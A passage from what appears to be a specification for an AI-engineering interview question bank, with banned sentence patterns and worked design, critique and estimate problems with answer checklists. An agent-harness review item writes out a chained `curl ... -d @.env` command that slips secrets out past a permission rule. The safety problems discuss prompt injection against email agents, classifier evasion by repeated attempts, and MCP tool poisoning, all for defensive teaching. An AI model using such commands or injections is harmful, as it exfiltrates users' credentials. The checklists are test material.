- "The vendor shows 97.5% recall at 1% false positives for its classifier. Why is that not the control?"
- "You said no to the raw database write. Product has data that manual refunds cost more than the fraud you are worried about. Now what?"

Reversal conditions:

- "What would you need to see in production to reverse this decision?"
- "Two senior engineers disagree on this. How do you decide without deciding by rank?"
- "A year from now this design is the bottleneck. What did you get wrong, and when could you have known?"

Operating the decision:

- "You have sixty days before the model is retired and twelve of forty prompts regress. Which ship degraded, and who signs off?"
- "The labelling expert has four hours a week. What does the eval programme look like in six weeks, and what do you refuse to gate?"
- "The provider changes X under the same model id. What in your design survives?"

Not staff follow-ups: "How would you verify it?", "How does it fail?", "What is the alternative?" asked generically. Those three appear as the follow-up template in every lesson read and should be retired as a template; each is fine when made specific.

### 3.5 Sentence patterns to ban

| Pattern | Example from the bank | Replacement |
|---|---|---|
| Analogy preamble | "You already know the inverted index: a map from term to the list of documents containing it" | "BM25 is a scoring function over an inverted index; the parts that are not in a log-search engine are IDF saturation and length normalisation, and those are what you tune." |
| Scripted first sentence | "Say \"I would read traces\" before you say the word \"metric\"." | Delete. |
| What interviewers hear | "Interviewers hear \"has never looked\"." | Delete. |
| Grading commentary in the answer | "The strongest answers make two moves that weaker ones miss." | Move the two moves into the checklist or the follow-ups; delete the sentence. |
| Mechanism-in-systems-terms opener | "Here is the mechanism in systems terms." | Start with the mechanism. |
| Definition by appositive | "**TTFT**, time to first token: from submitting the request to receiving the first token." | Use the term; link to the NIM definitions page in sources. |
| Rhetorical heading | "When do you stop reading?" | "Saturation and why 100 traces is the floor" |
| Rhetorical hint | "Which way does Python's `sorted` order by default?" | "Which stage's metric would you add to the eval report before touching the code?" |
| Hint that is the formula | "For cost, one candidate is 440 tokens at $0.05 per million." | "Which of the vendor's two billing models applies, and does it count the query?" |
| Self-naming tell | "The correct answer is the conditional one." | Delete; rewrite options to equal length. |
| Closing one-word follow-up | "Ship? No." | "Two must-pass cases broke and the owner of one of them left the company. Who decides, and by when?" |
| Identical scenario opener | "Scenario, not a real company:" in every lesson | One real, sourced incident per track; otherwise open on the mechanism. |
| Trivia prediction | "By what percentage did sandboxing cut permission prompts" | A prediction the reader derives from inputs on the page, or none. |
| Generic follow-up template | "How would you verify it works? / How does it fail? / What is the alternative?" | Specific pushback, reversal and operating questions (section 3.4). |

### 3.6 Construction rules for choices

- All options within 20 percent of the longest option's length.
- No option is a filler ("Layout does not matter", "Top-k with k = 1 differs from greedy"). Every wrong option is something a senior engineer has believed.
- At most one option per problem that describes a superseded version of a spec or product; the problem tests reasoning with the current version, not recall of the changelog.
- For debug problems with choices: at least two options describe real defects in the artefact; the stem asks for the one that explains the observed symptom, and the answer explains why the others are real and should also be fixed.
- Never state in the stem the fact that makes the answer obvious ("`request.body` is client-controlled").

## 4. Example problems at the target level

Three per track, fully specified. Each is modelled on a question with a public source already in the repository's source lists (date checked 2026-10-28, repository record). Numbers in prompts are either sourced or marked scenario; computed numbers show the arithmetic. New problem types `critique` and `workflow` (with `checklist`) are from the current `SPEC.md`.

### 4.1 foundations

**F1. Pick the attention layout for a 128K-context serving target** (type: design, difficulty: hard, seniority: [staff])

Modelled on: PracHub's report of an Anthropic onsite "Implement and analyze custom attention" (https://prachub.com/interview-questions/implement-and-analyze-custom-attention); Gemma 3 technical report (https://arxiv.org/abs/2503.19786); DeepSeek-V2 (https://arxiv.org/abs/2405.04434) and DeepSeek-V3 config (https://huggingface.co/deepseek-ai/DeepSeek-V3/blob/main/config.json); GQA (https://arxiv.org/abs/2305.13245); Llama 3.1 70B config (https://huggingface.co/unsloth/Meta-Llama-3.1-70B-Instruct/blob/main/config.json).

Prompt: You are choosing the attention layout for an in-house 70B-class model that must serve 128K-token contexts at batch 32 on 80 GB GPUs with FP8 weights (about 70 GB). Three published layouts are on the table: Llama 3.1 70B's GQA (80 layers, 8 KV heads, head_dim 128); Gemma 3's five sliding-window layers (window 1,024) per global layer; DeepSeek-V3's MLA (61 layers, a 512-element latent plus a 64-element positional key per layer). Compute per-token KV bytes for the layouts you can compute from the configs, say which one you cannot compute from the published report and why, and decide. State what you give up.

What a strong answer contains:

- GQA: 2 × 80 × 8 × 128 × 2 bytes = 327,680 bytes per token in BF16; at 128K tokens that is 42.9 GB per sequence, so batch 32 is 1.37 TB and does not fit any single node of 80 GB GPUs; the layout is out for this target without KV quantization and tensor parallelism, and the answer says what TP degree would be needed.
- MLA: 61 × (512 + 64) × 2 = 70,272 bytes per token; 128K tokens is 9.2 GB per sequence, 295 GB at batch 32; still multi-GPU, but within a 4-GPU shard.
- Sliding-window mix: per token, only the global layers grow with context; the local layers cap at 1,024 tokens. The Gemma 3 report measures the 1:3 mix at 32K and does not measure the shipped 5:1 layout separately, so the answer computes the bound from the layer counts rather than quoting a report figure.
- The costs: MLA and GQA are training-time decisions (GQA uptraining is reported at about 5% of pre-training compute in the GQA paper; MLA needs its own kernels); sliding layers route long-range information through few global layers, so a needle test at 128K (NoLiMa style, no lexical overlap) is the acceptance test, not the config's max position.
- What is given up: with MLA, kernel and engine support; with sliding layers, long-range recall risk; with GQA, the 128K target itself at this batch.

Staff follow-ups: the base model is fixed MHA from a vendor and cannot be retrained; which of these survive as post-training changes and at what quality risk? Product now wants 1M; which part of the decision do you reverse? Two engineers disagree on MLA versus sliding; what experiment settles it in two weeks?

**F2. Critique this fine-tuning plan** (type: critique, difficulty: hard, seniority: [senior, staff])

Modelled on: Thinking Machines, LoRA Without Regret (https://thinkingmachines.ai/blog/lora/); ZeRO (https://arxiv.org/abs/1910.02054); QLoRA (https://arxiv.org/abs/2305.14314); the amitshekhariitbhu bank's fine-tuning memory question (https://github.com/amitshekhariitbhu/ai-engineering-interview-questions).

Prompt: A team's plan, as written: "Full fine-tune the 70B base on our 8,000 support transcripts with Adam in mixed precision, same learning rate as the vendor's pre-training recipe, 3 epochs, on the 8-GPU node we already have. Evaluate on a held-out 10 percent of the transcripts. Merge and deploy as one model for all customers." List every flaw, then open the checklist.

Checklist (what a strong critique contains):

- Model states alone are 16 bytes per parameter under mixed-precision Adam (ZeRO accounting), so 70 × 10^9 × 16 = 1.12 TB before activations; an 8 × 80 GB node holds 640 GB. The plan does not fit without ZeRO sharding plus offload, or a different method.
- LoRA on all layers matches full fine-tuning on small and medium SFT sets per LoRA Without Regret; 8,000 transcripts is in that regime. The plan pays for a method it does not need.
- LoRA's optimal learning rate is about 10x full fine-tuning's in the same source; reusing a pre-training rate is wrong for either method.
- The held-out split is from the same distribution as training; there is no regression eval on general capability or on the behaviours the vendor model already had.
- Three epochs on 8,000 examples with no early-stopping signal.
- One merged model for all customers forecloses per-customer adapters, which is the operational reason to keep LoRA unmerged.
- Judgement item: QLoRA (4-bit base) would fit one 80 GB GPU per the paper's 65B on 48 GB result; acceptable if the team can tolerate the quality and speed trade-offs, which the plan should state.
- No statement of what the fine-tune is for (format, behaviour, knowledge); the method choice depends on it.

Staff follow-ups: the team has already spent two weeks and has a model that beats the base on the held-out set by a margin they like; do you ship it? What is the cheapest experiment that tells you whether the fine-tune or a prompt change produced the gain?

**F3. The new tokenizer and the bill** (type: estimate, difficulty: hard, seniority: [senior, staff])

Modelled on: Anthropic pricing page's statement that Claude 4.7 and later produce about 30% more tokens for the same text (https://platform.claude.com/docs/en/about-claude/pricing); Petrov et al. on tokenizer unfairness (https://arxiv.org/abs/2305.15425); Anthropic prompt caching docs (https://platform.claude.com/docs/en/build-with-claude/prompt-caching); Anthropic rate limits (https://platform.claude.com/docs/en/api/rate-limits).

Prompt: A vendor's next model uses a tokenizer that produces about 30 percent more tokens for the same text (the vendor's own statement). Your workload is a cached prefix plus per-request input, with a cache-read price much lower than the input price. Choose and state your prefix-to-suffix ratio and cache hit rate, then estimate the largest per-token price ratio (new price over old) at which per-task input cost does not rise. Then list every other quantity in your system that moves with the token count.

Accepted band for the uncached case: 0.70 to 0.80 (exact 1 / 1.3 = 0.769). The answer must show that under caching the break-even moves because cached reads are repriced too, and compute it for the stated assumptions.

What a strong answer contains: the 0.769 ratio for uncached tokens; that the cache minimum length, the context window's effective capacity (shrinks by the same 1.3), the input-tokens-per-minute limit (consumed 1.3x faster for uncached input) and any character-based chunker all move; that non-English traffic may move by a different factor (Petrov et al. report up to 15x spread across languages for one tokenizer, so the 1.3 is an average to be re-measured per language); what to measure before migrating (tokens per resolved task by language on real traffic).

Staff follow-ups: finance wants a single number for the budget; what do you give them and what caveat goes in writing? The vendor's older model retires in 60 days; what happens to the estimate if you cannot re-measure in time?

### 4.2 apis

**A1. Review the retry and failover layer** (type: critique, difficulty: hard, seniority: [senior, staff])

Modelled on: Brooker, Exponential Backoff and Jitter (https://aws.amazon.com/blogs/architecture/exponential-backoff-and-jitter/) and Timeouts, retries and backoff (https://builder.aws.com/content/3EumjoZascWd1oZiEgL8ORlv3qE/timeouts-retries-and-backoff-with-jitter); Claude API errors (https://platform.claude.com/docs/en/api/errors); OpenAI rate limits (https://developers.openai.com/api/docs/guides/rate-limits); LiteLLM proxy reliability (https://docs.litellm.ai/docs/proxy/reliability).

Prompt: Here is the client layer a team is about to ship (about 80 lines: an application retry loop of 4 attempts around the vendor SDK left at its default retries, fixed 200 ms sleeps, failover to a second provider on any exception, conversation history forwarded to the second provider unchanged, a prompt cache breakpoint set after a per-request timestamp). Review it as the staff engineer who must approve it.

Checklist:

- Retries stack: 4 application attempts × (1 + 2 SDK retries) = 12 requests per failing call; the fix is one retry owner and `max_retries=0` on the SDK.
- Fixed sleep with no jitter synchronises clients; the server's `retry-after` is ignored.
- Retries on 400, 401 and the spend-cap 429 (no `retry-after`) are wasted and hide the team's own bug.
- Failover on every exception includes the team's own 400s, so a schema bug fails over instead of alerting.
- History forwarded unchanged: tool_use and tool_result blocks are provider-specific; the second provider rejects or misreads them.
- Cache breakpoint after a timestamp: every request writes the cache and never reads it (the `apis/context-engineering` arithmetic).
- 529 overloaded is handled as a retry rather than as a shed-load or failover signal.
- Judgement item: failing over mid-conversation is acceptable only if a conversion step exists and has been tested on recorded conversations; otherwise fail over at conversation start only.

Staff follow-ups: the author says the stacked retries have never caused an incident; what do you require before approving, and what do you let through? The second provider is cheaper; the PM wants 30 percent of steady traffic on it; what in this review changes?

**A2. Forty prompts, sixty days, twelve regressions** (type: workflow, difficulty: hard, seniority: [staff])

Modelled on: Anthropic model deprecations (https://platform.claude.com/docs/en/about-claude/model-deprecations; 60 days notice; the Sonnet 4.5 snapshot deprecated 2026-09-30 and retiring 2026-11-30); migration to API version 2026-10-21 (https://platform.claude.com/docs/en/api/migration-2026-10-21); techinterview.org's "roll out new model versions without breaking existing prompts" (https://www.techinterview.org/post/3233474925/ml-engineer-interview-post-llm-era/).

Prompt: The provider has given notice that the model behind forty of your prompts retires in sixty days. Twelve of the forty regress on their eval suites under the candidate model; three of those twelve sit inside agent loops whose tool-call history is in the old model's format; two engineers are available part-time; the new API version rejects three parameters your client sets. Design the sixty-day workflow: ordering, what ships degraded, who signs off, and the rollback plan.

Checklist:

- Day-one work is request-shape compatibility, because nothing can be measured until requests are valid.
- Triage of the twelve by business impact × regression size, with the three agent prompts handled as conversion problems (history format) before quality problems.
- Shadow traffic and a canary per prompt, not one global switch; assignment by user hash so conversations stay on one model.
- Rainbow deployment for in-flight agent sessions: old and new versions run side by side until old sessions drain.
- An explicit list of prompts that ship degraded, with the owner's written acceptance and the metric that would trigger a rollback to the old model while it still exists.
- What happens on day 61 for anything not migrated: the requests fail, so the plan has a hard cutover for the remainder.
- Judgement item: holding one or two prompts on the old model until the last week is acceptable if the regression is severe and the owner accepts the cutover risk in writing.

Staff follow-ups: a VP asks for a single go or no-go date; what do you answer? The provider moves the retirement date up by two weeks; what do you drop?

**A3. Model the provider's prefix cache from its documentation** (type: code, difficulty: hard, seniority: [senior, staff])

Modelled on: Claude prompt caching docs (https://platform.claude.com/docs/en/build-with-claude/prompt-caching; prefix order tools, system, messages; up to 4 breakpoints; 20-block lookback; 5-minute TTL refreshed on use; minimum cacheable length); OpenAI prompt caching (https://developers.openai.com/api/docs/guides/prompt-caching; 1,024-token minimum); getperspective.ai's report of a token-budget allocator as an Anthropic phone-screen task (https://getperspective.ai/blog/anthropic-applied-ai-engineer-interview-process-frontier-lab-2026/markdown).

Prompt: Implement `CacheSim` that, given a time-ordered log of requests (each a list of blocks with a type in {tools, system, message}, a token count, and optional breakpoint flags) and a rule set (minimum cacheable prefix, TTL, refresh-on-use, lookback), returns per request the tokens billed as cache read, cache write and uncached, following the vendor's documented semantics. Then implement `reorder(request)` that moves volatile blocks to the end without changing any block that the vendor's prefix order fixes, and report the saving on a provided log.

Hidden tests: TTL expiry exactly at the boundary; a prefix shorter than the minimum is billed uncached with no write; a changed tools block invalidates system and messages; refresh-on-use extends TTL only for the matched prefix; lookback stops matching after the documented number of blocks; `reorder` never moves a tools block below a system block.

What the reference solution explains: which semantics it took from which page, which it had to decide because the page is silent (the answer lists them), and why a simulator built from the docs is the right tool for predicting a bill before changing a prompt.

Staff follow-ups: the vendor changes the TTL model; which tests break and which should not? Your simulator says a reordering saves 60 percent and production shows 20 percent; name three reasons in order of likelihood.

### 4.3 evals

**E1. Build the labelling operation** (type: workflow, difficulty: hard, seniority: [staff])

Modelled on: Hamel Husain and Shreya Shankar, AI Evals FAQ (https://hamel.dev/blog/posts/evals-faq/; at least 100 traces per review, 30 to 50 examples of each label in dev and test, 10 to 20 percent train split); Who Validates the Validators (https://arxiv.org/abs/2404.12272; criteria drift); Anthropic, Demystifying evals for AI agents (https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents).

Prompt: Three product teams want LLM judges to gate their releases within six weeks. One domain expert can give four hours a week. The failure base rate in production is about one in ten traces (scenario). Design the labelling operation: what gets labelled, by whom, in what order, how criteria are versioned, which failure modes get code checks instead of judges, and what you refuse to gate at week six.

Checklist:

- The arithmetic of labels: 30 to 50 failures in each of dev and test means 60 to 100 labelled failures per judge; at a 10 percent base rate, a uniform sample needs 600 to 1,000 traces per judge, so the plan uses targeted sampling (complaints, escalations) and states the bias that introduces.
- The expert's four hours sized against a chosen minutes-per-trace figure, with the conclusion that the expert labels the test set and adjudicates disagreements, while engineers do open coding on the rest.
- Criteria versioned like code, with the drift from Who Validates the Validators named as the reason the first rubric will be wrong.
- Inter-annotator agreement measured on a shared sample before trusting any judge number; it is the ceiling.
- Mechanical failures (schema, date matches, citations present) moved to code checks so the judge budget goes to what code cannot see.
- A written list of what will not be gated at week six and what the teams get instead (report-only metrics).
- Judgement item: synthetic traces are acceptable for dev, not for test.

Staff follow-ups: team two says their product is different and wants their own rubric; do you allow three rubrics with one expert? The expert disagrees with the engineers' labels 30 percent of the time; whose labels define truth?

**E2. Size the suite to catch a three-point regression** (type: estimate, difficulty: hard, seniority: [senior, staff])

Modelled on: Evan Miller, Adding Error Bars to Evals (https://arxiv.org/abs/2411.00640); McNemar's test (https://en.wikipedia.org/wiki/McNemar%27s_test); the existing `evl-014`.

Prompt: Your suite is paired (same cases, baseline and candidate). You want to catch a true regression of three points (80 percent to 77 percent) with a one-sided test at alpha 0.05 and power 0.8. Choose and state the flip rate you expect between two runs of similar prompts, justify it, and estimate how many cases the suite needs. Say which assumption dominates.

Accepted band for a stated flip rate of 8 percent: 450 to 650 cases. Worked, with the normal approximation to the one-sample proportion test on discordant pairs: a net three-point loss at an 8 percent flip rate means regressions of 5.5 percent and fixes of 2.5 percent of cases, so the regression share among flips is 0.055 / 0.08 = 0.6875 against 0.5 under the null. Required discordant pairs: (1.645 × 0.5 + 0.842 × sqrt(0.6875 × 0.3125))^2 / (0.1875)^2 = (0.8225 + 0.3901)^2 / 0.03516 = 1.4704 / 0.03516 = 41.8, so 42 flips, and 42 / 0.08 = 525 cases. At a 4 percent flip rate the same arithmetic gives about 1,050 cases; at 16 percent about 263.

What a strong answer contains: that the flip rate, not the pass rate, sets the size, so the first job is to measure it by running the baseline against itself; that one-sided versus two-sided must be fixed before the result; that near-duplicate cases inflate the apparent evidence; and that this is why "we have 300 cases" says nothing about what the suite can detect.

Staff follow-ups: the suite would need 1,000 cases and the team has 180; what do you gate on, and what do you say in the release notes? Each judged case costs money; where does the budget come from?

**E3. Critique this judge validation report** (type: critique, difficulty: hard, seniority: [senior, staff])

Modelled on: the judgy README (https://github.com/ai-evals-course/judgy); Zheng et al., Judging LLM-as-a-Judge (https://arxiv.org/html/2306.05685v4); Tripathi et al., Pairwise or Pointwise (https://arxiv.org/abs/2504.14716); Panickssery et al. (https://arxiv.org/abs/2404.13076).

Prompt: A one-page report (provided) says: "Our judge agrees with human labels 94 percent of the time on 60 examples, 8 of which are failures. The 60 examples include the 12 used as few-shot examples. The judge scores quality from 1 to 5 and we gate on the average. Pairwise comparisons are run with the baseline shown first. The judge is the same model family as the system under test. The production pass rate this week is 91 percent." Review it.

Checklist:

- 94 percent agreement on a set with 8 failures is compatible with catching few or none of them; TPR and TNR are missing.
- Validation on the few-shot examples is training-set evaluation.
- Eight failures cannot support a TPR estimate; the FAQ's 30 to 50 per label is the floor.
- A 1 to 5 average gate hides which failure mode moved and is sensitive to annotator drift; binary per failure mode.
- Fixed-order pairwise comparisons carry position bias; swap and count only consistent wins.
- Same-family judge: self-preference risk; use a different family or check that swapping judges preserves the ranking.
- The production pass rate is uncorrected for judge error and carries no interval; the correction formula is undefined if the judge does not beat chance.
- Judgement item: shipping with this judge as report-only is acceptable; gating on it is not.

Staff follow-ups: the team says relabelling 200 traces will take a month they do not have; what gate do you accept in the meantime? What one metric would you add to the dashboard to see when the judge drifts?

### 4.4 rag

**R1. Permissions, freshness and the ANN index** (type: design, difficulty: hard, seniority: [staff])

Modelled on: Hello Interview community reports naming Scale AI (Principal, July 2026) and Atlassian (Staff, July 2026) (https://www.hellointerview.com/community/questions/rag-system-design/cmoaemvhf1emv09adwqq9wk3f); pgvector README on filtering after the scan and iterative scans (https://github.com/pgvector/pgvector); Pinecone multitenancy limits (https://docs.pinecone.io/guides/index-data/implement-multitenancy); Microsoft 365 Copilot privacy page (https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-privacy).

Prompt (scenario inputs labelled): 2 million documents; a permission change must take effect in search within 60 seconds; 15 percent of queries come from users whose access covers under 1 percent of the corpus; p95 under 1.5 seconds to first token; one search engineer. Pick the index and the filter strategy, size the small-tenant case, and say what you give up.

What a strong answer contains:

- The post-filter arithmetic for the small-access case: an HNSW scan returning the default candidate count with a 1 percent filter yields well under one row on average, so post-filtering is not a design, and the answer picks between filtered traversal, iterative scans with a cap, partitioning by access scope, or exact search for small scopes, with the latency cost of each.
- ACLs as a separate, faster stream than content, with its own lag metric; the 60-second target applies to revocations and is tested with a canary user.
- Group labels on chunks rather than user ids, because filter lists are capped and group changes must not touch the index.
- A query-time re-check of the final chunks against the source for sources whose ACLs cannot be copied, and the latency it costs.
- What is given up: either recall for small scopes (if capped iterative scans) or operational complexity (partitions), stated as a choice with the metric that would reverse it.

Staff follow-ups: the regulator asks for proof that no answer ever used a document the asker could not open; what do you show them, and what can you not prove? Freshness at 60 seconds doubles indexing cost; the CFO asks for 10 minutes instead; what breaks?

**R2. Correctness fell and recall did not** (type: debug, difficulty: hard, seniority: [senior, staff])

Modelled on: Cohere reranker docs (query plus document tokens count toward the per-document limit; https://docs.cohere.com/docs/models); Barnett et al., Seven Failure Points (https://arxiv.org/abs/2401.05856); the existing `rag-014`.

Prompt: After a deploy, answer correctness on the 200-question set fell from 162 to 139 (scenario) while recall@20 of the fused list is unchanged and oracle-context correctness is unchanged. The deploy diff has seven lines: a reranker model swap, a reranker batch-size change, a prompt template edit adding a citation instruction, a chunker version bump, a dependency bump, a logging change, and a config line raising top_k from 20 to 30. A separate dashboard shows chunk token length p50 760 and p95 1,900 (scenario), and the new reranker's documentation gives a maximum of 512 tokens per query-plus-document pair. Which change explains the symptom, which other change is also a defect, and what measurement would have shown this before deploy?

Choices (equal length): the reranker truncates every chunk beyond its limit, so gold passages in the back half of long chunks are scored on their front half and fall out of the top 5 while recall@20 (measured before reranking) holds; the prompt edit made the model cite rather than answer; the chunker bump changed chunk ids and broke the gold labels; raising top_k to 30 added distractors and context rot explains the drop; the dependency bump changed the judge's behaviour.

Answer: the reranker limit against the chunk length distribution. The chunker bump is the secondary real defect (new chunk ids can silently invalidate gold labels and must be checked), and the measurement is "gold chunk in top 5 after rerank" alongside recall@20, which the lesson already names and the team did not plot. The evidence is deliberately incomplete: the answer states that chunk lengths and the reranker limit had to be joined from two places, and that a staff engineer asks for the reranker's input contract before approving a swap.

Staff follow-ups: shortening chunks to 500 tokens fixes the reranker and raises the vector count by half; who pays? The vendor says the limit will rise next quarter; do you wait?

**R3. Switch the embedding model at 80 million vectors** (type: estimate, difficulty: hard, seniority: [senior, staff])

Modelled on: OpenAI embeddings pricing and dimensions (https://developers.openai.com/api/docs/pricing; https://developers.openai.com/api/docs/guides/embeddings); the existing `sys-006` arithmetic; `fnd-006`'s premise that two models cannot share one index.

Prompt: You have 80 million chunks of about 400 tokens embedded with a 1,536-dimension model stored as float32. A new model is better on your eval set. Choose and state the embedding throughput you can get (from the provider's rate-limit page or your own measurement) and estimate the money, the wall-clock time, and the peak storage during the switch. Say which of the three binds.

Accepted band for the money: 500 to 800 dollars (80 × 10^6 × 400 = 32 × 10^9 tokens; at the listed 0.02 dollars per million tokens for text-embedding-3-small, 640 dollars). Storage: 80 × 10^6 × 1,536 × 4 bytes = 491.5 GB for one index; a dual-index cutover needs about 983 GB plus index overhead. Time depends on the reader's chosen throughput and is where the answer should spend its words.

What a strong answer contains: that the money is trivial and the binding constraints are rate limits and double storage; that incremental re-embedding into the same index is wrong because the two models' vectors are not comparable, so it is a parallel index with a backfill, an eval comparison and a read switch; that the eval must be re-labelled if chunking changed; and that deletes and ACL updates during the backfill need dual writes.

Staff follow-ups: the storage team cannot give you a second terabyte for six weeks; what do you do instead? The new model is better on average and worse on identifier queries; do you switch?

### 4.5 agents

**AG1. Tear down this harness** (type: critique, difficulty: hard, seniority: [staff])

Modelled on: OpenAI, Unrolling the Codex agent loop (https://openai.com/index/unrolling-the-codex-agent-loop/; cache prefix broken by tool-list changes); Anthropic, Effective harnesses for long-running agents (https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents; feature list and declaring victory early); Claude Code permissions (https://code.claude.com/docs/en/permissions; deny then ask then allow; compound commands split); Simon Willison, the lethal trifecta (https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/).

Prompt: A 90-line coding-agent harness (provided) that: matches permission rules against the whole command string; sorts the tool list by estimated relevance on every turn; compacts context by dropping old `tool_use` blocks but keeping their `tool_result` blocks; truncates long tool results from the front; writes its progress file only at the end of the run; decides "done" when the model's text contains "complete"; passes the parent process's environment, including `.env`, into the sandbox; retries any exception up to five times with the same arguments; has one global step budget and no per-tool budget. Review it before it runs in CI.

Checklist:

- Whole-string permission matching lets `pytest -q; curl ... -d @.env` through an allow rule; split on separators and evaluate deny first.
- Re-sorting tools per turn changes the prefix and defeats the prompt cache on every call.
- Dropping `tool_use` while keeping `tool_result` leaves orphaned results the model cannot attribute; clear results, keep calls.
- Truncating from the front removes the part of a result most tools put first (status, error); truncate from the middle or paginate.
- Progress written only at the end means a crash loses the run; write per step.
- "Done" from model text is the declaring-victory-early failure mode; done is a test or a verifiable state.
- Environment passthrough puts secrets inside the sandbox; the trifecta is complete with any network path.
- Retrying terminal errors with identical arguments is the `agt-002` loop with a cap that only bounds cost.
- No per-tool budget lets one tool consume the run.
- Judgement item: a global step budget is acceptable as a backstop if a spend budget and a repeat detector exist; alone it is not.

Staff follow-ups: the team says splitting on shell separators is "parsing bash with regex"; what do you require instead, and what do you accept for the first release? Which of these would you make a CI check that fails the harness's own build?

**AG2. Design the compaction and memory policy for a six-hour run** (type: workflow, difficulty: hard, seniority: [staff])

Modelled on: Anthropic, Effective context engineering for AI agents (https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents; compaction, structured note-taking, sub-agents returning condensed summaries); Claude context editing (https://platform.claude.com/docs/en/build-with-claude/context-editing; trigger and keep defaults; clearing invalidates cached prefixes); Claude compaction beta (https://platform.claude.com/docs/en/build-with-claude/compaction); Agent Skills specification (https://agentskills.io/specification; progressive disclosure).

Prompt: A coding agent runs unattended for up to six hours on a migration task. It reads hundreds of files, runs tests dozens of times and must not lose the decisions it made at hour one. Design the policy: what is cleared, when, what is persisted outside the window and in what shape, how sub-agents report back, how the prompt cache survives compaction, and how you test the policy with recorded runs.

Checklist:

- A trigger in tokens, not turns, with the kept-tool-uses count justified against the task (the provider default keeps 3).
- Decisions and invariants in a structured notes file that is re-injected, with provenance (which step produced each line), so compaction cannot delete them.
- Tool results cleared, tool calls kept, so the model knows what it did.
- Sub-agents return a bounded summary (the Anthropic post describes 1,000 to 2,000 tokens) plus file paths, never raw transcripts.
- Compaction batched so the cache miss it causes happens rarely, with the arithmetic of a miss on a long context.
- Skills or instructions loaded on demand rather than resident, with the per-skill metadata cost stated.
- A replay test: recorded six-hour traces re-run under the policy, asserting that planted hour-one decisions survive to hour six.
- Judgement item: server-side compaction is acceptable if its summaries are inspectable; otherwise client-side.

Staff follow-ups: after compaction the agent re-derives a decision differently and the two conflict; which wins, and how does the harness know? Compaction costs model calls; at what run length does the policy cost more than the context it saves?

**AG3. The delegation contract between an orchestrator and its workers** (type: design, difficulty: hard, seniority: [staff])

Modelled on: Anthropic, How we built our multi-agent research system (https://www.anthropic.com/engineering/multi-agent-research-system; orchestrator-workers; multi-agent at about 15x chat tokens; rainbow deployments); Anthropic, Building effective agents (https://www.anthropic.com/engineering/building-effective-agents; orchestrator-workers pattern); tau-bench pass^k (https://arxiv.org/abs/2406.12045).

Prompt: An orchestrator delegates research sub-tasks to parallel workers. In production, workers duplicate each other's work, two workers edit the same artefact, one worker returns 50,000 tokens, and after the orchestrator's context is compacted it loses track of which sub-tasks are done. Design the contract: task identity, ownership, result shape and size, failure and retry semantics, budget per worker, and how the orchestrator's state survives compaction. State the token cost you are accepting relative to a single agent and what you get for it.

What a strong answer contains: task ids with explicit ownership and a lease, so a retried worker does not duplicate a live one; a result schema with a size cap and a pointer to artefacts; idempotent artefact writes keyed by task id; a per-worker budget in tokens and time with a terminal status; orchestrator state as a durable task table outside the context, re-read after compaction; the 15x token figure as the price, with the condition under which a single agent is the right answer; and pass^k over repeated runs as the acceptance test because parallel systems are less deterministic.

Staff follow-ups: the product team wants the orchestrator to stream partial results to the user; what does that do to the contract? A worker produces a result the orchestrator cannot verify; who decides whether to use it?

### 4.6 safety

**S1. Write the decision: classifier, auto-reply, two weeks** (type: workflow, difficulty: hard, seniority: [staff])

Modelled on: EchoLeak (https://arxiv.org/abs/2509.10540; CVE-2025-32711, CVSS 9.3); CaMeL (https://arxiv.org/abs/2503.18813); Design Patterns for Securing LLM Agents (https://arxiv.org/abs/2506.08837); Meta, Agents Rule of Two (https://ai.meta.com/blog/practical-ai-agent-security/); Llama Prompt Guard 2 model card (https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-86M; English recall 97.5% at 1% false positives for the 86M model).

Prompt: An email agent that summarises and drafts replies is two weeks from launch. The CISO wants an injection classifier in front of the model as the primary control. The PM wants fully automatic replies for "simple" emails. You own the decision. Write it: what ships, what is deferred, which pattern from the public literature you are applying, and the residual risk in one paragraph a non-engineer can read.

Checklist:

- Names the trifecta and the Rule of Two as the frame, and shows that auto-reply plus inbox reading plus any outbound path is the full set.
- Chooses a pattern (action-selector or plan-then-execute for drafts; dual-LLM if any autonomy is kept) and says what it cannot do (CaMeL does not stop text-only attacks).
- Positions the classifier as a rate reducer with its published operating point, and shows why 97.5 percent recall is not a boundary: an attacker who sends many variants needs about 27 attempts for a coin-flip chance of one passing (ln 0.5 / ln 0.975 = 27.4), at near-zero cost per attempt.
- Ships drafts the user sends; defers auto-reply; if product insists, constrains it to the original sender with fixed templates.
- Closes the image channel (CSP and renderer) because EchoLeak needed no send tool.
- The residual-risk paragraph states what an attacker can still do (integrity: false summaries) and what is logged.
- Judgement item: launching with the classifier and drafts-only is acceptable; launching with auto-reply and the classifier is not, and the memo says who overrides that.

Staff follow-ups: the CISO points to a vendor benchmark and says the classifier is "state of the art"; what do you say, and what test do you propose? Three months later a leak happens through a channel you listed as residual; what did the memo buy you?

**S2. Review this MCP server before production** (type: critique, difficulty: hard, seniority: [senior, staff])

Modelled on: MCP Security Best Practices, revision 2026-07-28 (https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices; confused deputy, token passthrough forbidden, SSRF in OAuth discovery, state handle hijacking); MCP authorization (https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization); Invariant Labs tool poisoning (https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks); the ombharatiya question bank's MCP authorization question (https://github.com/ombharatiya/ai-system-design-guide/blob/main/00-interview-prep/01-question-bank.md).

Prompt: A remote MCP server (code and config provided) that: validates JWT signature and expiry but not audience; forwards the caller's bearer token to an upstream API; sits behind an OAuth proxy with a static client id and no per-client consent; aggregates tool descriptions from two third-party servers and presents them to the model unmarked; auto-approves calls whose annotations say `readOnlyHint: true`; issues pagination handles that are plain base64 of an offset and a user id; does not validate `Origin`; returns `tools/list` in dictionary order that varies between instances. Review it.

Checklist: one item per defect above, each tied to the spec section or incident that names it, plus two judgement items: Origin validation matters for local servers and is low priority for this remote one; deterministic `tools/list` is a cache and correctness concern rather than a security one, and should still block release because clients' prompt caches depend on it.

Staff follow-ups: the upstream API only accepts user tokens; how do you avoid passthrough without rewriting the upstream? Forty clients depend on the current pagination handle format; how do you rotate to signed handles without breaking them?

**S3. How many attempts does the attacker need?** (type: estimate, difficulty: hard, seniority: [senior, staff])

